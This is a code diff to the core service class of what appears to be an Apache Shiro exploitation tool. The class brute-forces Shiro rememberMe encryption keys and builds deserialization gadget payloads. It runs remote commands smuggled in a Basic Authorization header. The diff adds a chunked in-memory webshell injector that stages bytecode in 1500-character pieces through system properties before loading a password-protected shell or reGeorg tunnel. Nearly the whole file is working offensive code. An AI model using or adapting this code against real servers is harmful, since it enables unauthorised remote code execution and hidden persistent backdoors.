@@ -1,9 +1,9 @@
 
 package com.summersec.attack.core;
 
-import cn.hutool.http.HttpRequest;
 import cn.hutool.http.Method;
 import com.summersec.attack.deser.frame.Shiro;
+import com.summersec.attack.deser.payloads.CommonsBeanutilsString;
 import com.summersec.attack.deser.payloads.ObjectPayload;
 import com.summersec.attack.deser.plugins.servlet.MemBytes;
 import com.summersec.attack.deser.plugins.keytest.KeyEcho;
@@ -19,6 +19,7 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
 import java.net.Proxy;
+import java.net.URLDecoder;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.*;
@@ -26,6 +27,10 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 import javafx.collections.ObservableList;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
 import org.apache.commons.lang.StringUtils;
 import org.apache.shiro.codec.Base64;
 
@@ -45,9 +50,10 @@ public class AttackService {
     public static String postData = null;
     private final MainController mainController;
     public int flagCount = 0;
+    public static int chunkType = 0;
 
     public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
-        this.mainController = (MainController)ControllersFactory.controllers.get(MainController.class.getSimpleName());
+        this.mainController = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
         this.url = url;
         this.method = method;
         this.timeout = Integer.parseInt(timeout) * 1000;
@@ -79,7 +85,7 @@ public class AttackService {
     public String headerHttpRequest(HashMap<String, String> header) {
         String result = null;
         HashMap combineHeaders = this.getCombineHeaders(header);
-        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
+        Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
         try {
 /*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
             return result;*/
@@ -87,7 +93,7 @@ public class AttackService {
                 return result;
             }*/
             if (this.method.equals("GET")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
+                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method), this.url).setProxy(proxy).headerMap(combineHeaders, true).setFollowRedirects(false).execute().toString();
 
             } else {
 //                result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", this.postData, combineHeaders, this.timeout);
@@ -107,12 +113,12 @@ public class AttackService {
     public String bodyHttpRequest(HashMap<String, String> header, String postString) {
         String result = "";
         HashMap combineHeaders = this.getCombineHeaders(header);
-        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
+        Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
         try {
 
             if (postString.equals("")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-                if (result.contains("Host")){
+                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method), this.url).setProxy(proxy).headerMap(combineHeaders, true).setFollowRedirects(false).execute().toString();
+                if (result.contains("Host")) {
                     return result;
                 }
                 result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
@@ -137,7 +143,7 @@ public class AttackService {
             try {
                 String line;
                 try {
-                    while((line = br.readLine()) != null) {
+                    while ((line = br.readLine()) != null) {
                         shiroKeys.add(line);
                     }
                 } catch (IOException var10) {
@@ -160,8 +166,8 @@ public class AttackService {
     public List<String> generateGadgetEcho(ObservableList gadgetItems, ObservableList echoesItems) {
         List<String> targets = new ArrayList();
 
-        for(int i = 0; i < gadgetItems.size(); ++i) {
-            for(int j = 0; j < echoesItems.size(); ++j) {
+        for (int i = 0; i < gadgetItems.size(); ++i) {
+            for (int j = 0; j < echoesItems.size(); ++j) {
                 System.out.println();
                 System.out.println(echoesItems.get(j));
                 targets.add(gadgetItems.get(i) + ":" + echoesItems.get(j));
@@ -205,7 +211,7 @@ public class AttackService {
 
         try {
             Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
-            ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
+            ObjectPayload<?> gadgetPayload = (ObjectPayload) gadgetClazz.newInstance();
             Object template = Gadgets.createTemplatesImpl(echoOpt);
             Object chainObject = gadgetPayload.getObject(template);
             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
@@ -216,16 +222,47 @@ public class AttackService {
 
         return rememberMe;
     }
+    public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey, int num, String codes) {
+        String rememberMe = null;
 
+        try {
+            Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
+            ObjectPayload<?> gadgetPayload = (ObjectPayload) gadgetClazz.newInstance();
+            Object template = Gadgets.createTemplatesImpl(echoOpt, num, codes);
+            Object chainObject = gadgetPayload.getObject(template);
+            rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
+        } catch (Exception var9) {
+            var9.printStackTrace();
+            this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
+        }
+
+        return rememberMe;
+    }
+    public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey, String bytestr) {
+        String rememberMe = null;
+
+        try {
+            Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
+            ObjectPayload<?> gadgetPayload = (ObjectPayload) gadgetClazz.newInstance();
+            Object template = Gadgets.createTemplatesImpl(echoOpt, bytestr);
+            Object chainObject = gadgetPayload.getObject(template);
+            rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
+        } catch (Exception var9) {
+            var9.printStackTrace();
+            this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
+        }
+
+        return rememberMe;
+    }
     public void simpleKeyCrack(String shiroKey) {
         try {
             List<String> tempList = new ArrayList();
             tempList.add(shiroKey);
-            if (flagCount ==1){
+            if (flagCount == 1) {
                 this.keyTestTask(tempList);
+            } else {
+                this.keyTestTask2(tempList);
             }
-            else{
-                this.keyTestTask2(tempList);}
 
         } catch (Exception var3) {
             this.mainController.logTextArea.appendText(Utils.log(var3.getMessage()));
@@ -236,10 +273,9 @@ public class AttackService {
     public void keysCrack() {
         try {
             List<String> shiroKeys = this.getALLShiroKeys();
-            if (flagCount ==1){
+            if (flagCount == 1) {
                 this.keyTestTask(shiroKeys);
-            }
-            else {
+            } else {
                 //多个shiro场景的爆破key方式
                 this.keyTestTask2(shiroKeys);
                 this.mainController.logTextArea.appendText(Utils.log("[++] 含有多个shiro场景"));
@@ -280,12 +316,12 @@ public class AttackService {
 //                    result1.contains(shiroKeyWord);
 //                    flag = true;
 //                }
-                if(flag){
+                if (flag) {
                     this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                     flag = true;
                     flagCount = countDeleteMe(result);
 
-                }else {
+                } else {
 
                     this.mainController.logTextArea.appendText(Utils.log("[-] 未发现shiro框架！"));
 
@@ -300,44 +336,46 @@ public class AttackService {
         return flag;
     }
 
-    public static String getRandomString(int length){
-        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        SecureRandom random= new SecureRandom();
-        StringBuffer sb=new StringBuffer();
-        for(int i=0;i<length;i++){
-            int number=random.nextInt(62);
+    public static String getRandomString(int length) {
+        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        SecureRandom random = new SecureRandom();
+        StringBuffer sb = new StringBuffer();
+        for (int i = 0; i < length; i++) {
+            int number = random.nextInt(62);
             sb.append(str.charAt(number));
         }
         return sb.toString();
     }
+
     //计算包含几个deleteMe
-    public int countDeleteMe(String text){
+    public int countDeleteMe(String text) {
         // 根据指定的字符构建正则
         Pattern pattern = Pattern.compile("deleteMe");
         // 构建字符串和正则的匹配
         Matcher matcher = pattern.matcher(text);
         int count = 0;
         // 循环依次往下匹配
-        while (matcher.find()){ // 如果匹配,则数量+1
+        while (matcher.find()) { // 如果匹配,则数量+1
             count++;
         }
-        return  count;
+        return count;
 
     }
+
     public void keyTestTask(final List<String> shiroKeys) {
         Thread thread = new Thread(new Runnable() {
             public void run() {
                 try {
-                    for(int i = 0; i < shiroKeys.size(); ++i) {
-                        String shirokey = (String)shiroKeys.get(i);
+                    for (int i = 0; i < shiroKeys.size(); ++i) {
+                        String shirokey = (String) shiroKeys.get(i);
 
                         try {
-                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
+                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String) shiroKeys.get(i));
                             HashMap<String, String> header = new HashMap();
                             header.put("Cookie", rememberMe);
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
-                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
+                            if (result != null && !result.isEmpty() && !result.contains("=deleteMe")) {
                                 AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
                                 AttackService.this.mainController.shiroKey.setText(shirokey);
                                 AttackService.realShiroKey = shirokey;
@@ -364,16 +402,16 @@ public class AttackService {
         Thread thread = new Thread(new Runnable() {
             public void run() {
                 try {
-                    for(int i = 0; i < shiroKeys.size(); ++i) {
-                        String shirokey = (String)shiroKeys.get(i);
+                    for (int i = 0; i < shiroKeys.size(); ++i) {
+                        String shirokey = (String) shiroKeys.get(i);
 
                         try {
-                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
+                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String) shiroKeys.get(i));
                             HashMap<String, String> header = new HashMap();
                             header.put("Cookie", rememberMe);
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
-                            if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
+                            if (result != null && !result.isEmpty() && countDeleteMe(result) < flagCount) {
                                 AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
                                 AttackService.this.mainController.shiroKey.setText(shirokey);
                                 AttackService.realShiroKey = shirokey;
@@ -395,11 +433,12 @@ public class AttackService {
         });
         thread.start();
     }
+
     public void execCmdTask(String command) {
         HashMap<String, String> header = new HashMap();
         header.put("Cookie", attackRememberMe);
         String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
-        header.put("Authorization", "Basic "+b64Command);
+        header.put("Authorization", "Basic " + b64Command);
         String responseText = this.bodyHttpRequest(header, "");
         String result = responseText.split("\\$\\$\\$")[1];
         if (!result.equals("")) {
@@ -408,7 +447,7 @@ public class AttackService {
             try {
                 String defaultEncode = Utils.guessEncoding(b64bytes);
                 this.mainController.execOutputArea.appendText(new String(b64bytes, defaultEncode));
-                this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------"+ "\n");
+                this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------" + "\n");
             } catch (UnsupportedEncodingException var8) {
                 this.mainController.execOutputArea.appendText(new String(b64bytes) + "\n");
             }
@@ -418,41 +457,103 @@ public class AttackService {
 
     }
 
-    public void injectMem(String memShellType, String shellPass, String shellPath) {
-        String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
-        if (injectRememberMe != null) {
-            HashMap<String, String> header = new HashMap();
-            header.put("Cookie", injectRememberMe);
-            header.put("p", shellPass);
-            header.put("path", shellPath);
-
-            try {
-                String b64Bytecode = MemBytes.getBytes(memShellType);
-                String postString = "user=" + b64Bytecode;
-                String result = this.bodyHttpRequest(header, postString);
-                if (result.contains("->|Success|<-")) {
-                    String httpAddress = Utils.UrlToDomain(this.url);
-                    this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
-                    this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
-                    if (!memShellType.equals("reGeorg[Servlet]")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+    public void injectMem(String memShellType, String shellPass, String shellPath, boolean chunkType) throws NotFoundException, IOException, CannotCompileException, InterruptedException {
+        if (chunkType) {
+            String base64Bytecode = URLDecoder.decode(MemBytes.getBytes(memShellType));
+            int groupSize = 1500;
+            int length = base64Bytecode.length();
+            int startIndex = 0;
+            int endIndex = Math.min(length, groupSize);
+            int a = 1;
+            while (startIndex < length) {
+                String group = base64Bytecode.substring(startIndex, endIndex);
+                startIndex = endIndex;
+                endIndex = Math.min(startIndex + groupSize, length);
+                String injectchunkRememberMe = this.GadgetPayload(gadget, "ChunkedMemTool", realShiroKey, a, group);
+                if (injectchunkRememberMe != null) {
+                    HashMap<String, String> header = new HashMap();
+                    header.put("Cookie", injectchunkRememberMe);
+                    try {
+                        String result = this.headerHttpRequest(header);
+                    }catch (Exception var10) {
+                        this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
                     }
-                } else {
-                    if (result.contains("->|") && result.contains("|<-")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log(result));
-                    }
-
-                    this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
                 }
-            } catch (Exception var10) {
-                this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
+                a++;
+            }
+            Thread.sleep(1000);
+            String bytestr ="";
+            for(int i=1;i<=a-1;i++){
+                if(i<a-1){
+                    bytestr = bytestr + "System.getProperty(\""+i+"\")+";
+                }else {
+                    bytestr = bytestr + "System.getProperty(\""+i+"\");";
+                }
             }
 
-            this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
+            String loadinjectchunkRememberMe = this.GadgetPayload(gadget, "LoadChunkedMemTool", realShiroKey, bytestr);
+            if (loadinjectchunkRememberMe != null) {
+                HashMap<String, String> header = new HashMap();
+                header.put("Cookie", loadinjectchunkRememberMe);
+                header.put("p", shellPass);
+                header.put("path", shellPath);
+                try {
+                    String result = this.headerHttpRequest(header);
+                    if (result.contains("->|Success|<-")) {
+                        String httpAddress = Utils.UrlToDomain(this.url);
+                        this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
+                        this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
+                        if (!memShellType.equals("reGeorg[Servlet]")) {
+                            this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                        }
+                    } else {
+                        if (result.contains("->|") && result.contains("|<-")) {
+                            this.mainController.InjOutputArea.appendText(Utils.log(result));
+                        }
+                        this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
+                    }
+                }catch (Exception var10) {
+                    this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
+                }
+
+                this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
+            }
+
+        } else {
+                String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
+                if (injectRememberMe != null) {
+                    HashMap<String, String> header = new HashMap();
+                    header.put("Cookie", injectRememberMe);
+                    header.put("p", shellPass);
+                    header.put("path", shellPath);
+
+                    try {
+                        String b64Bytecode = MemBytes.getBytes(memShellType);
+                        String postString = "user=" + b64Bytecode;
+                        String result = this.bodyHttpRequest(header, postString);
+                        if (result.contains("->|Success|<-")) {
+                            String httpAddress = Utils.UrlToDomain(this.url);
+                            this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
+                            this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
+                            if (!memShellType.equals("reGeorg[Servlet]")) {
+                                this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                            }
+                        } else {
+                            if (result.contains("->|") && result.contains("|<-")) {
+                                this.mainController.InjOutputArea.appendText(Utils.log(result));
+                            }
+
+                            this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
+                        }
+                    } catch (Exception var10) {
+                        this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
+                    }
+
+                    this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
+                }
+            }
+
+
         }
 
     }
-
-    public static void main(String[] args) {
-    }
-}
